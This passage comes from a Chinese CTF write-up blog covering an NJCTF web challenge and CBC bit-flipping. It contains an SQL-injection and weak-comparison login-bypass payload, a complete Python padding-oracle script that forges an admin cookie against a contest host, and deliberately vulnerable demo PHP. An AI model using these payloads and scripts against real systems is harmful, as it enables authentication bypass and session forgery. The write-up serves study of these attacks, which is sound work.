class=\"title\">get_identity</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $defaultId;</span><br><span class=\"line\">    $j = $defaultId;</span><br><span class=\"line\">    $token = get_random_token();    <span class=\"comment\">// IV</span></span><br><span class=\"line\">    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'id'</span>] = base64_encode($c);</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"ID\"</span>, base64_encode($c));</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"token\"</span>, base64_encode($token));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($j === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">        $_SESSION[<span class=\"string\">'isadmin'</span>] = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> $_SESSION[<span class=\"string\">'isadmin'</span>] = <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test_identity</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">\"token\"</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">'id'</span>])) &#123;</span><br><span class=\"line\">        $c = base64_decode($_SESSION[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[<span class=\"string\">\"token\"</span>]))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($u === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">                $_SESSION[<span class=\"string\">'isadmin'</span>] = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> $_SESSION[<span class=\"string\">'isadmin'</span>] = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"ERROR!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($encrypted_pass, $pass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class=\"line\">    $iv = substr($encrypted_pass, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    $cipher = substr($encrypted_pass, <span class=\"number\">16</span>);</span><br><span class=\"line\">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $password == $pass;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">need_login</span><span class=\"params\">($message = NULL)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"   &lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;meta charset=\\\"UTF-8\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;link rel=\\\"stylesheet\\\" href=\\\"CSS/target.css\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;script src=\\\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\\\"&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;body&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($message)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"  &lt;div&gt;\"</span> . $message . <span class=\"string\">\"&lt;/div&gt;\\n\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;form method=\\\"POST\\\" action=''&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;div class=\\\"body\\\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t        &lt;div class=\\\"grad\\\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t            &lt;div class=\\\"header\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t            &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t            &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t            &lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">\t\t            &lt;div class=\\\"login\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\\\"text\\\" placeholder=\\\"username\\\" name=\\\"username\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\\\"password\\\" placeholder=\\\"password\\\" name=\\\"password\\\"&gt;               </span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\\\"submit\\\" value=\\\"Login\\\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/html&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_homepage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Hello ~~~ ctfer! \"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">\"isadmin\"</span>])</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;div&gt;&lt;a href=\\\"logout.php\\\"&gt;Log out&lt;/a&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    $username = (string)$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = (string)$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    $query = <span class=\"string\">\"SELECT username, encrypted_pass from users WHERE username='$username'\"</span>;</span><br><span class=\"line\">    $res = $conn-&gt;query($query) <span class=\"keyword\">or</span> trigger_error($conn-&gt;error . <span class=\"string\">\"[$query]\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($row = $res-&gt;fetch_assoc()) &#123;</span><br><span class=\"line\">        $uname = $row[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        $encrypted_pass = $row[<span class=\"string\">\"encrypted_pass\"</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($row &amp;&amp; login($encrypted_pass, $password)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"you are in!\"</span> . <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">        get_identity();</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;script&gt;alert('login failed!');&lt;/script&gt;\"</span>;</span><br><span class=\"line\">        need_login(<span class=\"string\">\"Login Failed!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    test_identity();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">\"id\"</span>])) &#123;</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        need_login();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>大致阅读下代码，可以看出程序逻辑，首先要通过用户认证，也就是说要登录成功，服务端会设置<code>$_SESSION[&quot;id&quot;]</code>, 这是后续Padding Oracle攻击的基础；<br><code>$_SESSION[&quot;id&quot;]</code>是<code>aes-128-cbc</code>加密后的密文，我们能获取初始向量IV,也就是<code>Cookie[&#39;token&#39;]</code>, 通过Padding Oracle攻击伪造IV使得解出来的明文为<code>admin</code>即可。</p>\n<h2 id=\"SQL注入-弱类型比较绕过登录\"><a href=\"#SQL注入-弱类型比较绕过登录\" class=\"headerlink\" title=\"SQL注入+弱类型比较绕过登录\"></a>SQL注入+弱类型比较绕过登录</h2><p>查看程序代码，用户认证是通过比较<code>$password</code> == <code>$pass</code>是否相等，<code>$pass</code> 是用户输入的密码，用户可控；而<code>$password</code> 是经AES解密后的值， 而密文<code>$encrypted_pass</code>是从数据库中查询出来的，存在SQL注入，用户可控，然而由于不知道秘钥，也就无法控制解密后的明文。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($encrypted_pass, $pass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class=\"line\">    $iv = substr($encrypted_pass, <span class=\"number\">0</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    $cipher = substr($encrypted_pass, <span class=\"number\">16</span>);</span><br><span class=\"line\">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $password == $pass;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查询<code>openssl_decrypt</code>函数，其返回结果解释如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The decrypted string on success or FALSE on failure</span><br></pre></td></tr></table></figure>\n<p>解密成功返回解密字符串， 失败则返回<code>false</code>, 如果我们令解密失败返回<code>false</code>, 那么我们只需要<code>$pass=&#39;&#39;</code>或<code>$pass=&#39;0&#39;</code>, 即可利用弱类型比较通过用户认证。要让解密失败，只需令密文长度不满足分组长度要求即可。</p>\n<p>payload如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=-1&apos; union select 1,1 %23</span><br><span class=\"line\">password=0</span><br></pre></td></tr></table></figure>\n<p>获取Cookie:</p>\n<ul>\n<li><code>token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D</code></li>\n<li><code>ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D</code></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D</span><br><span class=\"line\">Set-Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D</span><br><span class=\"line\">Content-Length: 155</span><br><span class=\"line\"></span><br><span class=\"line\">you are in!&lt;/br&gt;&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;Hello ~~~ ctfer! &lt;div&gt;&lt;a href=&quot;logout.php&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Padding-Oracle攻击位置cookie\"><a href=\"#Padding-Oracle攻击位置cookie\" class=\"headerlink\" title=\"Padding Oracle攻击位置cookie\"></a>Padding Oracle攻击位置cookie</h2><p>认证成功过后，就是利用Padding Oracle攻击获取<code>$_SESSION[&quot;id&quot;]</code>解密后的中间值value, 然后伪造IV, 使得 <code>IV XOR value = &#39;admin&#39; + string(0x11）* 11</code>, 即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str_xor</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">''</span>.join([chr(ord(i) ^ ord(j)) <span class=\"keyword\">for</span> i, j <span class=\"keyword\">in</span> zip(a, b)])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">\"http://218.2.197.235:23737/index.php\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    <span class=\"string\">'token'</span>: <span class=\"string\">''</span>,</span><br><span class=\"line\">    <span class=\"string\">'PHPSESSID'</span>: <span class=\"string\">'9uq1qjbeunb085pacngnmhupp3'</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">tmp_iv = <span class=\"string\">'0'</span> * <span class=\"number\">16</span></span><br><span class=\"line\">tmp_ivs = list(tmp_iv)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 中间值 [123, 216, 172, 195, 38, 202, 124, 77, 207, 192, 18, 77, 136, 98, 31]</span></span><br><span class=\"line\">value = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 只能破解出value后15个字符</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> flag <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">16</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"comment\"># brute</span></span><br><span class=\"line\">        tmp_ivs[<span class=\"number\">15</span>-len(value)] = chr(i)</span><br><span class=\"line\">        cookies[<span class=\"string\">'token'</span>] = base64.b64encode(<span class=\"string\">''</span>.join(tmp_ivs))</span><br><span class=\"line\">        resp = requests.get(base_url, cookies=cookies,</span><br><span class=\"line\">                            proxies=&#123;<span class=\"string\">'http'</span>: <span class=\"string\">'http://127.0.0.1:8080'</span>&#125;)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'ERROR'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> resp.content:</span><br><span class=\"line\">            value.append(flag ^ i)</span><br><span class=\"line\">            <span class=\"comment\"># 更改初始向量</span></span><br><span class=\"line\">            tmp_iv = <span class=\"string\">'0'</span> * (<span class=\"number\">16</span>-len(value)) + <span class=\"string\">''</span>.join(chr(value[i] ^ (flag+<span class=\"number\">1</span>))</span><br><span class=\"line\">                                        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(value)<span class=\"number\">-1</span>, <span class=\"number\">-1</span>, <span class=\"number\">-1</span>))</span><br><span class=\"line\">            tmp_ivs = list(tmp_iv)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">print</span> flag, i, value</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"number\">255</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> resp.content</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">'error'</span></span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 逆序</span></span><br><span class=\"line\">value.reverse()</span><br><span class=\"line\"></span><br><span class=\"line\">fake_id = <span class=\"string\">'admin'</span> + chr(<span class=\"number\">11</span>) * <span class=\"number\">11</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">256</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 爆破value 第一个字符</span></span><br><span class=\"line\">    value = chr(i) + <span class=\"string\">''</span>.join(chr(v) <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> value)</span><br><span class=\"line\">    iv = str_xor(value, fake_id)</span><br><span class=\"line\">    cookies[<span class=\"string\">'token'</span>] = base64.b64encode(iv)</span><br><span class=\"line\">    resp = requests.get(base_url, cookies=cookies)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'ERROR'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> resp.content <span class=\"keyword\">and</span> len(resp.content) &gt; <span class=\"number\">139</span>:</span><br><span class=\"line\">        <span class=\"keyword\">print</span> value</span><br><span class=\"line\">        <span class=\"keyword\">print</span> resp.content</span><br></pre></td></tr></table></figure>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>openssl_encrypt() 函数 options参数为<code>OPENSSL_RAW_DATA</code>, 使用的是<code>PKCS7</code>填充模式</p>\n","categories":["CTF"],"tags":["CBC","NJCTF","Padding Oracle"]},{"title":"基于CBC模式模式的密文攻击","url":"http://www.beesfun.com/2017/03/09/基于CBC模式的密文攻击/","content":"<p>关于CBC模式下的加密和解密，这里不过多阐述，可以参见 <a href=\"/2017/03/06/分组密码工作模式/\" title=\"分组密码工作模式\">分组密码工作模式</a>。</p>\n<p>对于CBC解密可以用以下式子表示：</p>\n<ul>\n<li>Plaintext-1 = Decrypt(Ciphertext-1) XOR IV  只用于第一个组块</li>\n<li>Plaintext-N = Decrypt(Ciphertext-N) XOR Ciphertext-N-1   用于第二及剩下的组块</li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"比特翻转攻击\"><a href=\"#比特翻转攻击\" class=\"headerlink\" title=\"比特翻转攻击\"></a>比特翻转攻击</h2><p>从CBC解密表达式可以知道，得到明文的前一步操作是异或操作，改变密文中的<code>一位</code>只会导致其对应的明文块完全改变，下一个明文块中的<code>对应位</code>发生改变，而不会影响到其它明文块的内容。<br>因此，修改IV可以操纵解密出的第一组明文，修改某一个密文分组可以操纵后一个解密出的明文分组，也就是说CBC模式存在两个攻击点：</p>\n<ul>\n<li>IV向量，影响第一个明文分组</li>\n<li>第N个密文分组, 影响第N+1个明文分组</li>\n</ul>\n<p>因此对IV和密文分组进行比特翻转攻击，可以伪造某个明文分组对应的比特位。</p>\n<p>这里给出如下Demo程序，输入参数<code>a</code>为AES CBC模式加密后的密文(16进制形式)，程序输出解密后的部分明文信息(id, name, email)，要求伪造密文，使得明文<code>id</code>对应的值为<code>0</code>, 程序如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// a=89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1</span></span><br><span class=\"line\">$cipherText = $_GET[<span class=\"string\">'a'</span>];       </span><br><span class=\"line\">$key = hex2bin(<span class=\"string\">'66616974683434343407070707070707'</span>);     <span class=\"comment\">// 16 bytes</span></span><br><span class=\"line\">$iv = hex2bin(<span class=\"string\">'f4ebb2df9c29efd7625561a15096cd24'</span>);      <span class=\"comment\">// 16 bytes</span></span><br><span class=\"line\">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class=\"string\">''</span>, MCRYPT_MODE_CBC, <span class=\"string\">''</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (mcrypt_generic_init($td, $key, $iv) != <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">    $p_t = mdecrypt_generic($td, hex2bin($cipherText));</span><br><span class=\"line\">    mcrypt_generic_deinit($td);</span><br><span class=\"line\">    mcrypt_module_close($td);</span><br><span class=\"line\">    $p_t = trimEnd($p_t);</span><br><span class=\"line\">    $tmp = explode(<span class=\"string\">':'</span>, $p_t);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($tmp[<span class=\"number\">2</span>] == <span class=\"string\">'0'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">print</span> @<span class=\"string\">'id:'</span>.@$tmp[<span class=\"number\">2</span>].<span class=\"string\">'&lt;br/&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'you are right'</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> @<span class=\"string\">'id:'</span>.@$tmp[<span class=\"number\">2</span>].<span class=\"string\">'&lt;br/&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> @<span class=\"string\">'name:'</span>.@$tmp[<span class=\"number\">0</span>].<span class=\"string\">'&lt;br/&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> @<span class=\"string\">'email:'</span>.@$tmp[<span class=\"number\">1</span>].<span class=\"string\">'&lt;br/&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pad2Length</span><span class=\"params\">($text, $padlen)</span></span>&#123;</span><br><span class=\"line\">    $len = strlen($text)%$padlen;</span><br><span class=\"line\">    $res = $text;</span><br><span class=\"line\">    $span = $padlen-$len;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>; $i&lt;$span; $i++)&#123;</span><br><span class=\"line\">        $res .= chr($span);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trimEnd</span><span class=\"params\">($text)</span></span>&#123;</span><br><span class=\"line\">    $len = strlen($text);</span><br><span class=\"line\">    $c = $text[$len<span class=\"number\">-1</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ord($c) &lt;$len)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>($i=$len-ord($c); $i&lt;$len; $i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($text[$i] != $c)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> $text;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> substr($text, <span class=\"number\">0</span>, $len-ord($c));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $text;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/03/09/基于CBC模式的密文攻击/CBC_Dec.png\">\n<p>已知密文长度为48 bytes, 若要改变明文id的值，假设id在第N块明文中第x个字符，表示为<code>N[x]</code>(x从1开始)，这里仅简单假设id为单字符，则改变密文<code>N-1[x]</code>或IV[x]， 即可伪造我们需要的id值。显然，我们需要一种方案快速定位到相应的密文位置或IV位置。</p>\n<p>已知XOR异或运算: X xor Y = Z, X、Y、Z三个数任意两个运算都可得到第三个。</p>\n<p>若不考虑IV, 则明文id肯定可以表示为 <code>id=A XOR B</code>，A是我们可控用来伪造id的密文值，那么改变密文A为:<code>A1 = id</code>, 则得到的明文id为<code>A1 XOR B = A XOR B XOR B = A</code>, 即判断明文id是否修改为<code>A</code>，就能知道是否找到相应的密文位置<code>N-1[x]</code>。假设我们需要伪造的id为<code>fake_id</code>, <code>fake_A= A XOR id XOR fake_id</code>, 得到的明文id就是<code>fake_A XOR B = A XOR id XOR fake_id XOR B = fake_id</code>, 